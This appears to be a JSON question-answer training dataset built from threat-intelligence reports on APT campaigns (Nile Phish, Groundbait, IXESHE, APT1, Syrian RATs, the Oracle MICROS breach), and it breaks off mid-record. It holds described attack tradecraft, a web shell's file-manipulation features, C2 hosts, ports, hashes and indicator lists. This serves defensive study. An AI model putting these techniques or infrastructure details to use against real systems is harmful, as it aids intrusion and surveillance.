[
  {
    "instruction": "Medium Headline: Mid-December \u2013 January 31st 2016 (ongoing)\nWhen we began systematically tracking the campaign in late November 2016 almost all of the messages we observed concerned issues related to Case 173, as well as being personalized to the recipient. This approach continued until late December. However, by mid-December, we began observing a growing number of generic phishing messages, mostly emphasizing account security issues.\nHere is an example of such a \"generic,\" but still personalized message.\nThese messages, while still personalized with users' names, relied on a range of common phishing tactics, such as warnings of suspicious login attempts, and other account security issues. In a few cases, the operators also included package-delivery notifications. After December 26, we no longer observed any personalized messages. This shift maps onto changes in server infrastructure (see: (<https://citizenlab.org/2017/02/nilephish-report/nilephishinfrastructure>)Nile Phish Infrastructure).\nExample Domains from Phase 2 Phishing\nIt is unclear why Nile Phish operators wound-down their use of Case 173 themes as the campaign went on. It is possible, for example, that they began to suspect that the targets were wary of such messages. It is equally possible that they simply decided to scale back some of their efforts, and rely more heavily on the pre-built examples in the toolkit they used. It is also possible that this represents a fluke either in how the messages were collected, or a pause on the part of the operators.\nThe final possibility is that Nile Phish is a component of a larger operation, and that the operators may intend to continue to use tailored social engineering for other purposes, such as delivering malware.\nBig Headline: Nile Phish Using Open-Source Phishing Toolkit\nNile Phish mounted this campaign with (<https://github.com/gophish/gophish>)gophish, an open-source phishing framework written in the Go language.\nThe gophish framework is intended to be used defensively, as part of anti-phishing trainings. This is the first offensive use of gophish of which we are aware. Its (<https://github.com/gophish/gophish/blob/master/README.md>)developer describes it as \"designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training.\" Support for capturing credentials submitted on phishing pages was added to gophish in (<https://twitter.com/jw_sec/status/694745865198514176>)February 2016.\nThe growing number of open-source and widely available phishing frameworks designed for penetration testing have made it easy to set up a phishing campaign. While some free and hosted phishing frameworks require a degree of authentication onto a particular domain, such as the online (<https://duo.com/resources/duo-insight>)Duo Insight, many that are self-hosted do not. The lack of authentication, while minimizing invasiveness and protecting user privacy, is also a double-edged sword, and means that it can be abused to conduct non-consensual and illegal phishing campaigns.\nMedium Headline: Discovery and Identification\nExamination of the phishing infrastructure provided evidence of artefacts from a cloned git repository, suggesting that this was a likely from a project on Github. This led us to conclude that the operators were likely making use of an existing phishing framework. Further investigation revealed that the domains were serving the gophish admin page on port 7777, and the scheme of the phishing URLs matched those of gophish.\nGophish links have a common format, which can be used to quickly identify a link sent via the platform.\nMedium Headline: Contact with Gophish\nCitizen Lab contacted (<https://github.com/jordan-wright>)Jordan Wright, the developer of Gophish and provided examples of the links used in the campaign. Wright provided us the following response:\n\"\u2026The links have the same structure as those sent in a Gophish campaign and there are Gophish administrative portals available on those hosts.\nGophish is designed to help administrators test their organization's exposure to phishing. By running phishing tests against one's own organization, the hope is that members of the organization will be better at spotting and avoiding phishing emails in the future, mitigating attacks like this.\nThe Gophish team does not condone using the software for any purpose other than running controlled tests to measure your own organization's exposure to phishing. While we cannot control users and prevent all misuse of the software, we will continue taking any measures possible to prevent this kind of abuse in the future.\"\nBig Headline: Nile Phish Infrastructure\nThe campaign's operators used commercial web hosting located in Europe ( (<https://www.choopa.com/>)Choopa and (<https://alexhost.com/>)AlexHost) to host the campaign. They have shown evidence of basic operational security practices, including server compartmentation between Phase 1 and Phase 2. Nevertheless, in what appears to have been a mistake, one domain resolved to servers from both phases at different times.\nUsing passive DNS analysis tools including (<https://www.passivetotal.org/>)PassiveTotal, we were able to further characterize the infrastructure, and how it was used throughout Phase 1 and Phase 2 of the campaign. We also identified an additional 13 domains through passive DNS research, indicating that the campaign may include a range of other targets not uncovered in our investigation.\n\nHow did the Nile Phish campaign leverage the gophish framework, and what implications does this have for the broader use of open-source phishing tools?",
    "output": "The Nile Phish campaign leveraged gophish, an open-source phishing framework written in the Go language, which is intended for defensive use in anti-phishing training. This is the first known offensive use of gophish. The growing availability of open-source phishing frameworks designed for penetration testing has made it easy to set up phishing campaigns. While some frameworks require authentication onto a particular domain, many self-hosted ones do not, which can lead to abuse for non-consensual and illegal phishing campaigns. This highlights the double-edged nature of such tools, where ease of use for legitimate purposes can also facilitate malicious activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Operation Groundbait APT use Phishing: Spearphishing Attachment to target its victims?",
    "output": "Phishing: Spearphishing Attachment is a technique used by adversaries to gain access to victim systems by sending spearphishing emails with a malicious attachment. In the case of Operation Groundbait, the attackers used this technique to target anti-government separatists in Eastern Ukraine, as well as Ukrainian government officials, politicians, and journalists. The attackers sent spearphishing emails with attached malicious executables or links to malicious files hosted on remote servers. The emails were crafted to appear relevant to the victims, with subject lines and attachment names that were designed to trick them into opening the malicious files. For example, one email had an attachment named '\u041d\u0430\u0446\u0433\u0432\u0430\u0440\u0434\u0435\u0439\u0446\u044b \u0441\u043e \u0448\u043f\u0440\u0438\u0446\u0430\u043c\u0438 \u0441\u0434\u0435\u043b\u0430\u043b\u0438 \u0438\u0437 \u0434\u043e\u043d\u0435\u0446\u043a\u043e\u0433\u043e \u043c\u0430\u043b\u044c\u0447\u0438\u043a\u0430 \u043c\u0438\u0448\u0435\u043d\u044c \u0434\u043b\u044f \u0440\u0430\u043a\u0435\u0442.exe', which translates to 'National Guard of Ukraine aimed rockets at boy from Donetsk'. Once the victim opened the attachment, the Prikormka dropper would display a decoy document to distract the victim while the malware was installed. The attackers also used social engineering tricks, such as posing as a trusted source, to convince the victims to open the malicious attachments. Overall, the use of Phishing: Spearphishing Attachment was a key component of the Operation Groundbait APT's tactics, allowing them to gain access to the systems of their targets and conduct cyber-surveillance operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: C&C INFRASTRUCTURE\nThe majority of the IXESHE campaign's C&C servers were based in Taiwan and the United States.\nThis is, however, not an indicator of attribution. It is not possible to determine where the attackers are based solely on where their C&C infrastructures are located. In addition, not all of the C&C servers are currently active. Many, if not all of them, appear to be compromised machines. In fact, at least 11 of the C&C servers were hosted on the compromised machines of an East Asian government, which made these very useful for launching targeted attacks against it.\nMost of the malware samples directly accessed an IP address as a C&C server. Connections to domains did exist in some cases. The domains were usually registered using free dynamic DNS service providers or compromised websites.\nOverall, this strategy was part of the attackers' modus operandi. By choosing compromised machines to act as C&C servers, fewer clues were left for investigators to follow in an attempt to find out who is behind the attacks compared with those using bulletproof hosting services and registered domain names. To conduct research on these servers, investigators need to differentiate between information related to malicious and legitimate use.\n\nBased on the above text, answer a question. Why did the IXESHE attackers choose to use compromised machines as C&C servers instead of bulletproof hosting services and registered domain names? How does this choice impact the investigation process?",
    "output": "The IXESHE attackers chose to use compromised machines as C&C servers to leave fewer clues for investigators. This strategy makes it harder to trace the attacks back to the perpetrators compared to using bulletproof hosting services and registered domain names. By utilizing compromised machines, the attackers can blend their malicious activities with legitimate usage, making it more challenging for investigators to differentiate between the two. This approach effectively covers their tracks and complicates the investigation process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: GOOD HOSPITALITY, OR SWEPT UNDER THE RUG?\nOracle maintains in (PDF) about the MICROS attack that \"Oracle's Corporate network and Oracle's other cloud and service offerings were not impacted.\" But a confidential source within Oracle's Hospitality Division told KrebsOnSecurity that the breach first started in one of Oracle's major point-of-sale data centers \u2014 specifically the company's large data center in Manassas, Va.\nAccording to my source, that particular center helps large Oracle hospitality industry clients manage their fleets of MICROS point-of-sale devices.\n\"Initially, the customer's network and the internal Oracle network were on the same network,\" said my source, who spoke under condition of anonymity because he did not have permission\nfrom his employer to speak on the record. \"The networking team did a network segmentation of these two networks \u2014 ironically for security purposes. However, it seems as if what they have done actually allowed access from the Russian Cybercrime group.\"\nMy source said that in mid-July 2016 Oracle sent out an email alert to employees of its hospitality division that they had to re-image their laptops without backing anything up.\n\"All of the files and software that were on an employee's computer were deleted, which was crippling to business operations,\" my source recalled. \"Project management lost all their schedules, deployment teams lost all the software that they use to install on customer sites. Oracle did not tell the employees in this email that they got hacked but just to re-image everything with no backups. It seems as if Oracle did a pretty good job sweeping this incident under the rug. Most employees don't know about the hack and it hasn't been a huge deal to the customers. However, it is estimated that this cost them billions, so it is a really major breach.\"\nI sent Oracle a litany of questions based on the above, but a spokesperson for the company said Oracle would comment on none of it.\n= Indicators =\n104.156.240.212\n104.232.35.136\n104.250.153.57\n107.181.246.211\n107.181.250.221\n108.61.57.43\n128.177.144.59\n144.168.45.128\n151.80.8.10\n162.212.105.78\n172.28.202.31\n184.22.81.68\n185.29.9.28 (c)\n185.86.149.115\n185.86.149.60\n186.106.120.113\n190.82.81.132\n194.146.180.58\n195.154.43.52\n198.23.210.156\n207.182.98.21\n208.167.254.234\n209.51.131.190\n216.155.131.74\n216.170.116.120\n220.130.157.99\n23.227.196.99\n23.249.164.109\n31.131.17.128\n45.63.23.135\n45.63.96.216\n5.45.179.185\n5.45.192.117\n51.254.95.100\n51.254.95.99\n59.55.142.171\n60.228.38.213/login.aspx\n66.232.124.175\n71.63.154.49\n72.233.55.10\n74.125.39.18\n80.83.118.240\n80.83.118.245\n82.163.78.188\n83.183.76.156\n85.186.125.217\n86.55.7.54\n87.236.210.109\n87.236.210.116\n87.98.153.34\n91.207.60.68\n94.140.120.133\n95.215.44.136\n95.215.45.228\n95.215.45.64\n95.215.45.69\n95.215.45.90\n95.215.45.98\n95.215.46.2\n95.215.46.32\n95.215.46.76\n95.85.12.179\n98.129.249.174\nclients14-google.com\nmail.clients12-google.com\nns1.stats1-google.com\nns2.stats1-google.com\nwambiri.net/login.aspx\n\nWhat measures did Oracle take internally in response to the breach, and how did these actions impact business operations and employees?",
    "output": "In mid-July 2016, Oracle sent out an email alert to employees of its hospitality division instructing them to re-image their laptops without backing up any data. This action resulted in the deletion of all files and software on employees' computers, which significantly disrupted business operations. Project management teams lost their schedules, and deployment teams lost the software they used for installations on customer sites. Oracle did not explicitly inform employees in this email that they had been hacked, but the directive to re-image everything without backups suggests a serious security concern. This measure was part of Oracle's efforts to address the breach, which is estimated to have cost them billions of dollars.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the 'zehir4.asp' script facilitate file manipulation on the victim's system, and what specific actions can an attacker perform using this script?",
    "output": "The 'zehir4.asp' script facilitates file manipulation on the victim's system by allowing the attacker to perform various actions through its interface. Specifically, the script enables the attacker to edit, delete, copy, and download files. Additionally, the attacker can browse, delete, or move folders. This is evident from the provided code snippet where functions like 'driveGo' are used to navigate different drives and paths. For example, when the attacker adds the text 'Hacked by STTEAM' to the 'TEST_FILE.txt', the script processes this request and updates the file accordingly. The attacker can also delete files, as shown in the subsequent request where the 'TEST_FILE.txt' is deleted.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The PlugX malware revisited: introducing \"Smoaler\"\nBy Gabor Szappanos, Principal Researcher, SophosLabs\nJuly 2013\nIn a recent SophosLabs article about the [(<>)A], we concluded with these words:\nThere is no doubt that PlugX development will go on, and new features and tricks will be introduced.\nWe'll keep an eye on them, and if any interesting or important new features appear, we'll be sure to let you know.\nFast forward just under two months, and we're ready to tell you the next stage in this ongoing saga.\nThe malware family we'll be looking at in this report is known as Smoaler, and it shares many features with PlugX, notably that:\n\u2022 Smoaler relies on the same vulnerability, . [(<>)B]\n\u2022 Smoaler uses the same exploit shellcode.\n\u2022 Smoaler uses similar visual distractions, or decoys, with a Tibetan theme.\n\u2022 Smoaler uses the same initial malware modules to initiate infection.\nThereafter, the new malware follows a different path to the PlugX samples we looked at last time.\nWe shall analyse the \"what happens next\" component of Smoaler later on.\nTo clarify the terminology we have used above, remember that:\n\u2022 A vulnerability is a software bug that could potentially be abused to make your computer behave insecurely.\n\u2022 An exploit is a real-world trick by which a vulnerability can be activated to bypass security.\n\u2022 Shellcode is runnable program code delivered inside a file that is supposed to be plain data, and therefore implicitly safe, but that can be executed without the user's knowledge or consent by exploiting a vulnerability.\n\u2022 Initial malware modules, also called droppers, are malware components, often delivered or activated by shellcode, used to deliver the full malware, or payload, that the attacker wants to install.\nQ: How does the Smoaler malware leverage its shared characteristics with PlugX to initiate an infection, and what are the key components involved in this process?",
    "output": "Smoaler malware leverages several shared characteristics with PlugX to initiate an infection. These key components include: \\n\\n1. **Vulnerability Exploitation**: Smoaler relies on the same software vulnerability as PlugX to gain unauthorized access to a system. \\n\\n2. **Exploit Shellcode**: Both Smoaler and PlugX use identical exploit shellcode to activate the vulnerability and bypass security measures. \\n\\n3. **Visual Distractions**: Smoaler employs similar visual distractions or decoys with a Tibetan theme to divert the user's attention while the malware operates in the background. \\n\\n4. **Initial Malware Modules (Droppers)**: Smoaler utilizes the same initial malware modules, also known as droppers, to deliver the full malware payload. These droppers are often delivered or activated by the shellcode. \\n\\nThese components work together to initiate the infection process, with the vulnerability providing the entry point, the shellcode executing the exploit, the decoys distracting the user, and the droppers delivering the final malicious payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.1. Infection Vectors\nMalware writers are using multiple techniques to deliver their files and entice the victims to run them, creating an effective infection vector. Mainly depending on social engineering the attackers exploit:\n\u2022 Victims' trust in social networking forums\n\u2022 Victims' curiosity in following news related to political conflict in Syria\n\u2022 Victims' fear of attacks from government\n\u2022 Victims' lack of technology awareness\nOnce they have infected the victim's computer, attackers have full access and control over victim's devices. In the following section we show different versions of posts sent via popular file sharing sites or social networking platforms. The sample details and domain lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document.\nSmall Headline: New samples\nMore recent samples, starting from the end of 2013, have shown a more organized development effort, creating highly stealth and graphically-enticing applications.\nIn this analysis we have seen how Syrian malware has evolved, showing no signs of stopping any time soon. Even though new malicious Syrian samples are appearing each day, the subset presented here will hopefully give the reader an overall view of the techniques and tools that are currently being used to target Syrian citizens.\nVery Small Headline: Curiosity killed the cat: browsing a  of wanted activists leads to infection.\n\u0627\n\u0631\u062a\u062e\u0627\u0642 \u0623\u0632\u0647\u062c\u0629 \u0627\u0648\u064a\u0628\u0645\u0643\u0644\u0631\u062a \u0627\u0627\u062e\u0644\u0629\u0635 \u0627\u0628\u0631\u062c\u0645\u0644\u0645 \u064a\u0644\u0639 \u0648\u0644\u0645\u0645\u0643 \u0648\u0627\u0628\u064a\u0642 \u0627\u0635\u0639\u0629\u0628 \u0627\u0644\u0627\u062f\u0633\nWe found a set of compressed files on a popular social networking site; when, extracted it showed a database containing a list of activists and wanted individuals in Syria. A video entitled was published on November 9 2013, and \" \u0655\" the download link for this database application was included in the information section of the video.\n\u0644\u0627\u0627 \u062c\u0645\u0627\u0646\u0631\u0628\u0654\u064a\u0646\u0637\u0648\u0644\u0627 \u0646\u0645\nThe download URL redirected victims to a file-sharing service where the file was being hosted. The .rar\", with the MD5 signature 0c711bf29815aecc65016712981compressed RAR file \" 59a74 and a file-size of 7,921,063 bytes was protected with the password \"111222333\".\nThe video requests the victim to scan the password protected \".rar\" file using VirusTotal to verify that it is not infected.\nAfter extracting all the files to a temporary folder, we were presented with the application itself and a text file needed to access the \"hidden\" features of the program.\nThe file \"PASSWORD.txt file\" contained the following text:\nVery Small Headline: syria123!@#\n\u0629\u0631\u0635\u0646\u0644\u0627 \u0629\u0647\u0628\u062c \u0629\u0646\u0635\u0627\u0631\u0642 \u0621\u0627\u0639\u062f\u0644\u0627\u0628 \u0627\u0646\u064a\u0644\u0639 \u0627\u0648\u0644\u062e\u0628\u062a \u0644\u0627\nUpon closer inspection, the first and last buttons of the application were functional, but the others generated error messages (claiming that some files were missing).\n\u0641\u064a\u0639 \u0634\u0627\u0634 \u0645\u0627\u0645\u0644\n, General Global File) uses \"data-base.db.exe\" (MD5 8f16efb51fe67961eThe first button ( e31c4f36cbe11db), which was placed into \"C:\\Users\\User\\AppData\\Roaming\"and, when executed, extracts the  Excel spreadsheet file \"Data-Base.xslx\" (MD5 f0a8a1556efbb106b6297700d4cce61b) from the \"Data-Base.db\" (MD5 95a5c3e91bbb4a3a323433841fbef82a) file in the main folder.\n\u0625\u0647\u0646\u0627\u0621 \u0627\u0644\u0631\u0628\u0646\u0627\u062c\u0645\n) is the exit button. The last button (\nHere is some interesting information worth noting:\n\u0628\u0631\u0646\u0627\u0645\u0627 \u062c\u0644\u0623\u0645\u0627 \u0646\u0644\u0648\u0637\u0646\u064a\n.exe\" is not detected as a malicious file. \"\u2022\n\u2022 The file \"data-Base.db\" is detected as a malicious file.\nThe file \"data-base.db\" is a compressed archive:\n\u2022 Product name from the file signature: Project1\n\u2022 Publisher name from the signature: Syrian malware\n\u2022 Compilation Timestamp: 2013-11-09 14:47:26\nWhen system32.exe is run, the process \"iexplorer.exe\" is spawned and is automatically registered for Startup.  The file connects to the IP address 31.9.48.7 TCP on port 999. As mentioned in , the IP address 31.9.48.7 belongs to the Syrian Telecommunications Establishment (STE).\nOther temporary files used for the infection were also detected, such as \"system32.exe\" (MD5: 9424b355a3670fd7749d3d25cbea18cb) which was copied into the \"C:\\Users\\user\\appdata\\ local\\temp\\\" folder.\nThe presence of DarkComet's \"DC_MUTEX-*\" was a giveaway of the usage of this remote administration tool.\nDuring infection, the Excel spreadsheet is displayed, comprising 96763 rows and 13 columns of activist information. The rows correspond to records of individuals wanted by the government and the columns correspond to information about the individuals. While there is no column description, data in each column reflects the type of data.\nSmall Headline: 3.2.2. Files named \"Scandals\" are quite attractive Using shockingly disturbing videos to distribute malware\n\u0641\u0636\u0627\u062d\u0626\nA disturbing video showing injured victims of recent bombings was used to appeal to people's fear and exert them to download a malicious application available in a public file-sharing website. After .exe\" proved to be heavily obfuscated with the commercial our initial analysis, the file named \" utility \"MaxToCode\" for .NET as a means of avoiding early detection by antivirus solutions.\nWhen executed, the original sample created another executable file in the Windows' temporary folder (C:\\Users\\[USERNAME]\\AppData\\Local\\Temp) named \"Trojan.exe\", which corresponds to the code of the RAT itself. This is used to save all keystrokes and system activity to another file in the same location, \"Trojan.exe.tmp\".\nCaptured information is sent to a dynamic domain corresponding to the host \"hacars11.no-ip.biz\", using local port 1177 with no SSL encryption (but base64 encoded), making the analysis of the network traffic a much easier task. During the initial connection to the remote server (after an initial ping to check for internet connectivity), the Trojan will send the machine's name, installed Windows version, logged username, webcam availability and the version of the RAT in use.\nSeveral embedded command line scripts are in charge of adding the Trojan's executable file to the Windows Firewall allowed list, while at the same time disabling security zone checking in Internet Explorer. System persistence is obtained via a modification in the \"Software\\Microsoft\\Windows\\ CurrentVersion\\Run\" registry key and by adding a copy of the malware to the Startup folder.\nEven though different obfuscation techniques are used in the samples we analysed, all of them have underlying dependencies on the .NET framework namespaces, which eventually allows deep source code inspection of the threat.\nSmall Headline: 3.2.3. \"Ammazon Internet Security\" the \"popular Antivirus\"\nIf you thought the era of fake antivirus programs was over, here comes a newly developed sample to challenge your beliefs. With the innocent title of \"Ammazon Internet Security\", this malicious application tries to mimic a security scanner, even including a quite thorough graphical user interface and some interactive functionality.\nAgain, this shows the simplicity of creating a graphical user interface that will trick most of the non-tech-savvy population. Using nothing more than a couple of buttons and a catchy name, Syrian malware groups were hoping that the intended victims would fall for the trap. Analyzing the code interestingly revealed that it has the look--feel of a security application; but, of course, no real security features. While silently executing a remote administration tool when launching this \"security suite\", targeted victims were left without their \"Ammazon\" protection but witha RAT installed.\nFrom the Windows process list shown in Process Explorer, we were able to see \"J. L Antivirus 4.0\" executing in our system, and through Process Monitor we caught the creation of the \"analysis\" log file for our fake antivirus. Behind the curtains, a connection is made to a remote host, sending real time information on all our activities \u2014 the real cost of this free internet security suite!\nAmong the many programming methods found inside the source code, we were even able to find a \"CheckForUpdates\" function; and if you look closely enough you can even see \"Detection\" and \"Quarantine\" assemblies included in this application. So, not only has a lot of work gone into creating this fake antivirus, the authors also followed good programming practices and implemented modules for each specific (albeit fake) functionality. Maybe at a really quick first sight this could pose as a legitimate tool, but a deeper inspection reveals its true malicious nature.\nThe real log file was one where all keystrokes were recorded and later sent from the computer via a TCP connection. Even though this type of keylogging functionality is nothing new, when we consider how these malicious applications are being used, and the control they give to the attackers, we can start to measure the importance of reporting these threats and providing protection from them.\nEvidently, the malware authors didn't care much to provide an option to close the \"antivirus\", and if you were to kill the process you would get a nice 'blue screen of death' and an unexpected system reboot. Surely, the fake application will load  again once everything is back up, creating an interesting method for guaranteeing persistence.\nRead the text above and answer this question: How did the attackers ensure persistence and control over the infected systems in the case of the 'Curiosity killed the cat' infection vector?",
    "output": "In the 'Curiosity killed the cat' infection vector, the attackers ensured persistence and control over the infected systems by using a multi-step approach. The malicious application extracted a malicious Excel spreadsheet from a hidden file. The file 'system32.exe' was copied into the temporary folder and executed, spawning the process 'iexplorer.exe' and registering it for Startup. The file connected to the IP address 31.9.48.7 on port 999, which belonged to the Syrian Telecommunications Establishment (STE). Temporary files used for the infection were also detected, and the presence of DarkComet's 'DC_MUTEX-*' indicated the usage of a remote administration tool.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: \" It is unprofessional and groundless to accuse the Chinese military of launching cyber attacks without any conclusive evidence.\"2\n\u2014 Chinese Defense Ministry, January, 2013\n1 \"Mike Rogers, Statement to the U.S. House, Permanent Select Committee on Intelligence, Open Hearing: Cyber Threats and Ongoing Efforts to Protect the Nation, Hearing, October 4, 2011, http://intelligence.house.gov/sites/intelligence.house.gov/files/documents/100411CyberHearingRogers. pdf, accessed February 6, 2013.\n2 \"Chinese hackers suspected in attack on The Post's computers.\" The Washington Post, Feb. 1, 2013, http://www.washingtonpost.com/business/ technology/chinese-hackers-suspected-in-attack-on-the-posts-computers/2013/02/01/d5a44fde-6cb1-11e2-bd36-c0fe61a205f6_story.html, accessed Feb. 1, 2013.\nSmall Headline: aPt1 is believed to be the 2nd Bureau of the People's Liberation army (PLa) General staff Department's (GsD) 3rd Department (\u603b\u53c2\u4e09\u90e8\u4e8c\u5c40), which is most commonly known by its Military unit Cover Designator (MuCD) as unit 61398 (61398\u90e8\u961f).\n\u00bb\u00bb The nature of \"Unit 61398's\" work is considered by China to be a state secret; however, we believe it engages in harmful \"Computer Network Operations.\"\n\u00bb\u00bb Unit 61398 is partially situated on Datong Road (\u5927\u540c\u8def) in Gaoqiaozhen (\u9ad8\u6865\u9547), which is located in the Pudong New Area (\u6d66\u4e1c\u65b0\u533a) of Shanghai (\u4e0a\u6d77). The central building in this compound is a 130,663 square foot facility that is 12 stories high and was built in early 2007.\n\u00bb\u00bb We estimate that Unit 61398 is staffed by hundreds, and perhaps thousands of people based on the size of Unit 61398's physical infrastructure.\n\u00bb\u00bb China Telecom provided special fiber optic communications infrastructure for the unit in the name of national defense.\n\u00bb\u00bb Unit 61398 requires its personnel to be trained in computer security and computer network operations and also requires its personnel to be proficient in the English language.\n\u00bb\u00bb Mandiant has traced APT1's activity to four large networks in Shanghai, two of which serve the Pudong New Area where Unit 61398 is based.\nSmall Headline: aPt1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has demonstrated the capability and intent to steal from dozens of organizations simultaneously.4\n\u00bb\u00bb Since 2006, Mandiant has observed APT1 compromise 141 companies spanning 20 major industries.\n\u00bb\u00bb APT1 has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable intellectual property.\n\u00bb\u00bb Once APT1 has established access, they periodically revisit the victim's network over several months or years and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists from victim organizations' leadership.\n\u00bb\u00bb APT1 uses some tools and techniques that we have not yet observed being used by other groups including two utilities designed to steal email \u2014 GETMAIL and MAPIGET.\n\u00bb\u00bb APT1 maintained access to victim networks for an average of 356 days.5 The longest time period APT1 maintained access to a victim's network was 1,764 days, or four years and ten months.\n\u00bb\u00bb Among other large-scale thefts of intellectual property, we have observed APT1 stealing 6.5 terabytes of compressed data from a single organization over a ten-month time period.\n\u00bb\u00bb In the first month of 2011, APT1 successfully compromised at least 17 new victims operating in 10 different industries.\n4  We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has conducted. Therefore, Mandiant is establishing the lower bounds of APT1 activities in this report.\n5  This is based on 91 of the 141 victim organizations. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network.\nSmall Headline: aPt1 maintains an extensive infrastructure of computer systems around the world.\n\u00bb\u00bb APT1 controls thousands of systems in support of their computer intrusion activities.\n\u00bb\u00bb In the last two years we have observed APT1 establish a minimum of 937 Command and Control (C2) servers hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were registered to organizations in China (709), followed by the U.S. (109).\n\u00bb\u00bb In the last three years we have observed APT1 use fully qualified domain names (FQDNs) resolving to 988 unique IP addresses.\n\u00bb\u00bb Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into their attack infrastructure from 832 different IP addresses with Remote Desktop, a tool that provides a remote user with an interactive graphical interface to a system.\n\u00bb\u00bb In the last several years we have confirmed 2,551 FQDNs attributed to APT1.\nSmall Headline: In over 97% of the 1,905 times Mandiant observed aPt1 intruders connecting to their attack infrastructure, aPt1 used IP addresses registered in shanghai and systems set to use the simplified Chinese language.\n\u00bb\u00bb In 1,849 of the 1,905 (97%) of the Remote Desktop sessions APT1 conducted under our observation, the APT1 operator's keyboard layout setting was \"Chinese (Simplified) \u2014 US Keyboard\". Microsoft's Remote Desktop client configures this setting automatically based on the selected language on the client system. Therefore, the APT1 attackers likely have their Microsoft\u00ae operating system configured to display Simplified Chinese fonts.\n\u00bb\u00bb 817 of the 832 (98%) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to China.\n\u00bb\u00bb We observed 767 separate instances in which APT1 intruders used the \"HUC Packet Transmit Tool\" or HTRAN to communicate between 614 distinct routable IP addresses and their victims' systems using their attack infrastructure. Of the 614 distinct IP addresses used for HTRAN communications:\n\u2212\u00bb 614 of 614 (100%) were registered in China.\n\u2212\u00bb 613 (99.8%) were registered to one of four Shanghai net blocks.\nSmall Headline: the size of aPt1's infrastructure implies a large organization with at least dozens, but potentially hundreds of human operators.\n\u00bb\u00bb We conservatively estimate that APT1's current attack infrastructure includes over 1,000 servers.\n\u00bb\u00bb Given the volume, duration and type of attack activity we have observed, APT1 operators would need to be directly supported by linguists, open source researchers, malware authors, industry experts who translate task requests from requestors to the operators, and people who then transmit stolen information to the requestors.\n\u00bb\u00bb APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who handle finances, facility management, and logistics (e.g., shipping).\nSmall Headline: In an effort to underscore that there are actual individuals behind the keyboard, Mandiant is revealing three personas that are associated with aPt1 activity.\n\u00bb\u00bb The first persona, \"UglyGorilla\", has been active in computer network operations since October 2004. His activities include registering domains attributed to APT1 and authoring malware used in APT1 campaigns. \"UglyGorilla\" publicly expressed his interest in China's \"cyber troops\" in January 2004.\n\u00bb\u00bb The second persona, an actor we call \"DOTA\", has registered dozens of email accounts used to conduct social engineering and spear phishing attacks in support of APT1 campaigns. \"DOTA\" used a Shanghai phone number while registering these accounts.\n\u00bb\u00bb We have observed both the \"UglyGorilla\" persona and the \"DOTA\" persona using the same shared infrastructure, including FQDNs and IP ranges that we have attributed to APT1.\n\u00bb\u00bb The third persona, who uses the nickname \"SuperHard,\" is the creator or a significant contributor to the AURIGA and BANGAT malware families which we have observed APT1 and other APT groups use. \"SuperHard\" discloses his location to be the Pudong New Area of Shanghai.\nSmall Headline: Mandiant is releasing more than 3,000 indicators to bolster defenses against aPt1 operations.\n\u00bb\u00bb Specifically, Mandiant is providing the following:\n\u2212\u00bb Digital delivery of over 3,000 APT1 indicators, such as domain names, IP addresses, and MD5 hashes of malware.\n\u2212 \u00bb Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in APT1's arsenal of digital weapons.\n\u2212\u00bb Thirteen (13) X.509 encryption certificates used by APT1.\n\u2212\u00bb A compilation of videos showing actual attacker sessions and their intrusion activities.\n\u00bb\u00bb While existing customers of Mandiant's enterprise-level products,  and \u00ae, have had prior access to these APT1 Indicators, we are also making them available for use with Redline\u2122, our free host-based investigative tool. Redline can be downloaded at .\nSmall Headline: Conclusion\nThe sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified group based in China leaves little doubt about the organization behind APT1. We believe the totality of the evidence we provide in this document bolsters the claim that APT1 is Unit 61398. However, we admit there is one other unlikely possibility:\nA secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign right outside of Unit 61398's gates, performing tasks similar to Unit 61398's known mission.\n\nWhat are the key personas associated with APT1's activities, and how do their roles contribute to the overall operation?",
    "output": "A: Three key personas are associated with APT1's activities: 'UglyGorilla', 'DOTA', and 'SuperHard'. 'UglyGorilla' has been active since October 2004, registering domains attributed to APT1 and authoring malware used in their campaigns. 'DOTA' registers dozens of email accounts used for social engineering and spear phishing attacks, utilizing a Shanghai phone number. Both 'UglyGorilla' and 'DOTA' share the same infrastructure, including FQDNs and IP ranges attributed to APT1. 'SuperHard' is the creator or a significant contributor to the AURIGA and BANGAT malware families used by APT1 and other APT groups. These personas play crucial roles in domain registration, malware creation, and social engineering, contributing to the overall effectiveness and reach of APT1's cyber espionage operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
